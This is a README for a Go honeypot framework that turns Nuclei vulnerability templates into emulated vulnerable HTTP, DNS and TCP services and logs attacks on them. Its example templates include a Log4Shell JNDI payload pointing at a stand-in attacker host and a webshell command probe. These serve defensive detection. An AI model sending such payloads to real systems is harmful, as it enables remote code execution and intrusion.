<div align="center">
  <img src="image.webp" alt="Breadcrumb-Pot Logo" width="400"/>

  # Breadcrumb-Pot

  **A configurable, multi-protocol honeypot framework based on Nuclei templates and CVE patterns**

  [![Go Version](https://img.shields.io/badge/Go-1.21+-00ADD8?style=flat&logo=go)](https://golang.org)
  [![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)

</div>

---

## 📋 Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Architecture](#architecture)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Configuration](#configuration)
- [Usage](#usage)
- [Security](#security)
- [Contributing](#contributing)
- [License](#license)

---

## 🎯 Overview

Breadcrumb-Pot is a sophisticated honeypot framework written in Go that automatically generates vulnerable endpoints, DNS responses, and TCP services based on Nuclei vulnerability templates. By reversing Nuclei templates (which describe how to detect vulnerabilities), the honeypot can emulate those vulnerabilities and log all interaction attempts for security research and threat intelligence.

## ✨ Features

### Core Capabilities

- **Multi-Protocol Support**: HTTP/HTTPS, DNS, and TCP
- **Nuclei Template Integration**: Automatically parse and reverse official Nuclei templates
- **Kata Containers Ready**: Deploy with VM-level isolation for maximum security
- **Configurable Interaction Levels**:
  - **Low**: Basic logging with minimal responses
  - **Medium**: Realistic vulnerable responses matching CVE signatures
  - **High**: Full emulation with stateful multi-step interactions
- **Dynamic Route Registration**: Endpoints are registered automatically from templates
- **Comprehensive Logging**: All interactions logged with full request/response details
- **Statistics & Monitoring**: Real-time statistics on attacks, CVEs triggered, and top paths
- **YAML Configuration**: Easy configuration with filtering by severity, tags, or specific CVEs
- **Response Delays**: Configurable delays to simulate real services

### Advanced Payload Capture

- **Command Injection Capture**: Detects and logs shell command attempts
- **File Upload Capture**: Saves all uploaded files (webshells, backdoors, etc.)
- **Webshell Detection**: Automated analysis of uploaded webshells
- **SQL Injection Logging**: Captures SQL injection attempts with full queries
- **Code Execution Detection**: Log4Shell, JNDI, template injection, serialization attacks
- **Interactive Response Simulation**: Realistic command execution and SQL query responses
- **Automated Threat Analysis**: SHA-256 hashing, metadata preservation, forensics-ready
- **Full Attack Chain Capture**: Complete TTPs (Tactics, Techniques, Procedures)


## 🏗️ Architecture

```
┌─────────────────────────────────────────────────┐
│         Template Parser & Loader               │
│  (Parse Nuclei YAML templates into rules)      │
└────────────────┬────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────┐
│           Rule Engine & Matcher                │
│  (Match incoming requests to templates)         │
└────────────────┬────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────┐
│         Response Generator                      │
│  (Generate vulnerable responses)                │
└────────────────┬────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────┐
│      Interaction Tracking & Logging             │
│  (Log all attempts, alert on matches)           │
└─────────────────────────────────────────────────┘
```

## 📦 Installation

### Prerequisites

- Go 1.21 or higher
- Root/sudo access (required for ports < 1024 like DNS port 53)

### Building from Source

```bash
# Clone the repository
git clone <repository-url>
cd breadcrumb-pot

# Install dependencies
go mod download

# Build the binary
go build -o breadcrumb-pot cmd/breadcrumb-pot/main.go

# Or build and install
go install ./cmd/breadcrumb-pot
```

## 🚀 Quick Start

### 1. Generate Default Configuration

```bash
./breadcrumb-pot -generate-config
```

This creates a `config.yaml` file with sensible defaults.

### 2. Add Nuclei Templates

**Option A: Use Official Nuclei Templates (Recommended)**

```bash
# Automatically download official templates
make setup-nuclei

# Or manually
./scripts/setup-templates.sh
```

Then update `config.yaml`:
```yaml
templates:
  directory: nuclei-templates/http/cves  # Use official CVE templates
  severities: [critical, high]
```

**Option B: Use Example Templates**

The repository includes example templates in `templates/` directory that you can use for testing.

**Option C: Create Custom Templates**

Create your own Nuclei-compatible YAML templates in the `templates/` directory.

m
### 3. Configure the Honeypot

Edit `config.yaml`:

```yaml
server:
  http:
    enabled: true
    port: 8080

  dns:
    enabled: true
    port: 53

  tcp:
    enabled: true
    ports:
      - port: 22
        protocol: ssh
      - port: 23
        protocol: telnet

templates:
  directory: templates
  severities:
    - critical
    - high
    - medium

logging:
  level: info
  file: logs/honeypot.log

responses:
  interaction: medium
```

### 4. Run the Honeypot

```bash
# For privileged ports (DNS 53, SSH 22, etc.), use sudo
sudo ./breadcrumb-pot -config config.yaml

# For unprivileged ports only
./breadcrumb-pot -config config.yaml
```

## ⚙️ Configuration

### Server Configuration

#### HTTP Server

```yaml
server:
  http:
    enabled: true
    host: 0.0.0.0
    port: 8080
    tls: false
    cert_file: /path/to/cert.pem  # Required if TLS is enabled
    key_file: /path/to/key.pem    # Required if TLS is enabled
```

#### DNS Server

```yaml
server:
  dns:
    enabled: true
    host: 0.0.0.0
    port: 53
    network: both  # Options: udp, tcp, both
```

#### TCP Server

```yaml
server:
  tcp:
    enabled: true
    ports:
      - port: 22
        protocol: ssh
      - port: 23
        protocol: telnet
      - port: 21
        protocol: ftp
      - port: 3306
        protocol: mysql
```

### Template Configuration

Filter which templates to load:

```yaml
templates:
  directory: templates

  # Load only specific template IDs
  enabled:
    - CVE-2021-44228
    - CVE-2021-26855

  # Exclude specific template IDs
  disabled:
    - some-low-priority-template

  # Filter by tags
  tags:
    - cve
    - rce
    - sqli

  # Filter by severity
  severities:
    - critical
    - high
    - medium
```

### Logging Configuration

```yaml
logging:
  level: info           # debug, info, warn, error
  file: logs/honeypot.log
  format: text          # text or json
  max_size: 100         # Max file size in MB
  max_backups: 10       # Number of old log files to keep
  max_age: 30          # Max age of log files in days
```

### Response Configuration

```yaml
responses:
  interaction: medium   # low, medium, or high

  delays:
    enabled: true
    min: 100ms
    max: 1s

  # Custom responses for specific templates
  custom:
    CVE-2021-44228: "<html>Custom response for Log4j</html>"
```

**Interaction Levels:**

- **low**: Minimal responses, just logs requests
- **medium**: Realistic vulnerable responses matching CVE signatures (default)
- **high**: Full emulation with stateful multi-step interactions

## 💡 Usage Examples

### View Statistics Periodically

```bash
./breadcrumb-pot -config config.yaml -stats-interval 30
```

This prints statistics every 30 seconds.

### Health Check Endpoint

When HTTP server is enabled, a health check endpoint is available:

```bash
curl http://localhost:8080/_health
```

### Statistics Endpoint

View real-time statistics:

```bash
curl http://localhost:8080/_stats
```

## 📝 Nuclei Template Format

Breadcrumb-Pot parses standard Nuclei templates. Here's an example:

```yaml
id: CVE-2021-44228
info:
  name: Apache Log4j2 RCE
  severity: critical
  cve: CVE-2021-44228
  tags:
    - cve
    - rce
    - log4j

http:
  - method: GET
    path:
      - "{{BaseURL}}/admin"
      - "{{BaseURL}}/login"

    headers:
      User-Agent: "${jndi:ldap://attacker.com/a}"

    matchers:
      - type: status
        status:
          - 200
```

The honeypot will:
1. Register endpoints for `/admin` and `/login`
2. Log any requests containing JNDI patterns in headers
3. Return appropriate vulnerable responses

## 📊 Log Files

### Main Log File

Located at the path specified in `logging.file` (default: `logs/honeypot.log`):

```
2025-01-11 12:00:00 INFO Starting Breadcrumb-Pot v1.0.0
2025-01-11 12:00:01 INFO Loaded 25 templates
2025-01-11 12:00:02 INFO HTTP server listening on 0.0.0.0:8080
2025-01-11 12:00:15 INFO HTTP GET /admin from 192.168.1.100 - Template: admin-panel, CVE: , Status: 200
```

### Interaction Log File

Located at `logs/honeypot_interactions.jsonl` (JSONL format):

```json
{"timestamp":"2025-01-11T12:00:15Z","protocol":"HTTP","source_ip":"192.168.1.100","dest_port":8080,"template_id":"admin-panel","method":"GET","path":"/admin","headers":{"User-Agent":["curl/7.64.1"]},"response":"..."}
```

## 📈 Statistics

The honeypot tracks:
- Total interactions by protocol
- Unique IP addresses
- CVEs triggered
- Templates triggered
- Top accessed paths
- Uptime

Example output:

```
===== Honeypot Statistics =====
Uptime: 3600.00 seconds
Total Interactions: 42
  HTTP: 38
  DNS:  2
  TCP:  2
Unique IPs: 5

CVEs Triggered:
  CVE-2021-44228: 10
  CVE-2021-26855: 5

Top Paths Accessed:
  /admin: 15
  /login: 12
  /phpinfo.php: 8
===============================
```

## 🔒 Security Considerations

### Running as Honeypot

- Deploy on isolated infrastructure
- Never run on production networks
- Monitor logs for attack patterns
- Consider using virtual machines or containers

### Privileged Ports

To bind to ports < 1024 (e.g., DNS port 53, SSH port 22):

```bash
# Option 1: Use sudo
sudo ./breadcrumb-pot -config config.yaml

# Option 2: Grant capabilities (Linux)
sudo setcap CAP_NET_BIND_SERVICE=+eip ./breadcrumb-pot
./breadcrumb-pot -config config.yaml
```

### Network Configuration

- Use firewall rules to restrict access
- Consider rate limiting
- Log all traffic for analysis

## 🔧 Advanced Usage

### Custom Template Development

Create custom templates for specific threats:

```yaml
id: custom-backdoor
info:
  name: Custom Backdoor Detection
  severity: critical
  tags:
    - backdoor
    - custom

http:
  - method: POST
    path:
      - "{{BaseURL}}/shell.php"

    body: "cmd=whoami"

    matchers:
      - type: status
        status:
          - 200
```

### Integration with SIEM

The JSONL interaction log format is designed for easy ingestion into SIEM platforms:

- Splunk: Use forwarder to monitor `logs/honeypot_interactions.jsonl`
- ELK Stack: Use Filebeat to ship logs to Elasticsearch
- Graylog: Configure GELF input and parse JSONL

### Docker Deployment

Example Dockerfile:

```dockerfile
FROM golang:1.21 AS builder
WORKDIR /app
COPY . .
RUN go build -o breadcrumb-pot cmd/breadcrumb-pot/main.go

FROM alpine:latest
RUN apk add --no-cache ca-certificates
COPY --from=builder /app/breadcrumb-pot /usr/local/bin/
COPY config.yaml /etc/breadcrumb-pot/
COPY templates/ /etc/breadcrumb-pot/templates/
CMD ["breadcrumb-pot", "-config", "/etc/breadcrumb-pot/config.yaml"]
```

## 📁 Project Structure

```
breadcrumb-pot/
├── cmd/
│   └── breadcrumb-pot/
│       └── main.go              # Main application entry point
├── pkg/
│   ├── config/
│   │   └── config.go           # Configuration loading and validation
│   ├── logger/
│   │   └── logger.go           # Logging and statistics
│   ├── parser/
│   │   └── parser.go           # Nuclei template parser
│   ├── response/
│   │   └── generator.go        # Response generation
│   ├── server/
│   │   ├── http.go            # HTTP server
│   │   ├── dns.go             # DNS server
│   │   └── tcp.go             # TCP server
│   └── types/
│       └── template.go         # Type definitions
├── templates/                   # Nuclei templates directory
├── logs/                       # Log files directory
├── config.yaml                 # Configuration file
├── go.mod
└── README.md
```

## 🤝 Contributing

Contributions are welcome! We're looking for help in the following areas:

- Additional protocol support (UDP, SMTP, etc.)
- Enhanced response generation
- Machine learning for attack detection
- Web UI for monitoring
- Integration with threat intelligence feeds

To contribute:

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 🙏 Credits

- **Nuclei Templates**: [ProjectDiscovery](https://github.com/projectdiscovery/nuclei-templates)
- **Inspired by**: Cowrie, Dionaea, and HoneyPy honeypot frameworks

## ⚠️ Disclaimer

This tool is designed for **authorized security testing and research purposes only**. Users are responsible for ensuring they have proper authorization before deploying honeypots. The authors assume no liability for misuse of this software.

**Use responsibly. Never deploy on unauthorized infrastructure.**

---

<div align="center">
  <img src="image.webp" alt="Breadcrumb-Pot" width="200"/>

  **Made with ❤️ for security research**

  [Documentation](docs/) | [Issues](issues/) | [Discussions](discussions/)
</div>
